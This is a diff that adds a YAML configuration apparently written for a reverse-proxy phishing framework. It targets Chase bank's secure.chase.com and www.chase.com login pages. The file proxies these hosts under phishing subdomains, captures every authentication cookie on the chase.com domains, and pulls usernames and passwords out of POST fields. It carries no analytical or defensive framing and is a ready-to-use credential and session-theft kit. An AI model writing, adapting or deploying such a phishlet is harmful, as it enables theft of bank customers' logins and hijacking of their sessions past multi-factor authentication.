@@ -1,0 +1,32 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'chase.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'chase.com', session: false, is_landing: false}
+sub_filters:
+auth_tokens:
+  - domain: '.chase.com'
+    keys: ['.*,regexp']
+  - domain: 'chase.com'
+    keys: ['.*,regexp']
+  - domain: '.www.chase.com'
+    keys: ['.*,regexp']
+  - domain: 'www.chase.com'
+    keys: ['.*,regexp']
+  - domain: '.secure.chase.com'
+    keys: ['.*,regexp']
+  - domain: 'secure.chase.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/'
+credentials:
+  username:
+    key: 'userName|email|login|UserName|username|userid|login_email|login_username|userId|userld'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwrd|unenc_password|password|pass|login_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'secure.chase.com'
+  path: '/'
